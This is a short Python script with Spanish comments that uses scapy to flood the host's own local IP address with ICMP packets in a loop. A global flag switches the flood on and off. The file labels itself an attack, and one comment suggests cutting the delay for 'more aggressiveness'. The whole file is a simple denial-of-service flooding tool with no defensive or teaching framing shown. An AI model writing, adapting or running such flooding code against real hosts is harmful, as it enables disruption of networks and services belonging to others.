import time
import random
import socket
from scapy.all import IP, ICMP, send

running = False  # Variable global de control

def get_local_ip():
    """Obtiene la IP local de la máquina en la red"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        print(f"Error al obtener IP local: {e}")
        return "127.0.0.1"

def attack():
    global running

    try:
        target_ip = get_local_ip()
        print(f"[INFO] Ataque ICMP iniciado contra {target_ip}")

        while True:
            while running:
                packet = IP(dst=target_ip)/ICMP()
                send(packet, verbose=False)
                time.sleep(0.01)  # Puedes reducir más si quieres más agresividad

            time.sleep(1)  # Espera si no está corriendo

    except Exception as e:
        print(f"[ERROR] Error durante el ataque: {e}")
